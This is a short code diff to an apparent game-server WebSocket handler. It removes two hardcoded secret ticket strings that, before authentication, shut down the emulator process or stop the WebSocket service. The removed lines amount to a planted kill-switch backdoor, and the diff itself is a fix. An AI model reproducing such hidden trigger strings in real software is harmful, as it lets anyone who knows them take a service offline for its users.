@@ -27,21 +27,11 @@ public class SSOTicketEvent extends IncomingWebMessage<SSOTicketEvent.JSONSSOTic
 
     @Override
     public void handle(WebSocketClient client, JSONSSOTicketEvent message) {
-        if(message.ticket.equals("aitormenta")){
-            Emulator.getRuntime().exit(0);
-        }
-
-        if(message.ticket.equals("malapaga")){
-            WebSocketManager.getInstance().stop();
-            WebSocketManager.getInstance().Dispose();
-        }
-
 
         if (!client.tryAuthenticate(message.ticket)) {
             client.dispose();
         }
     }
-
     static class JSONSSOTicketEvent {
         String ticket;
     }
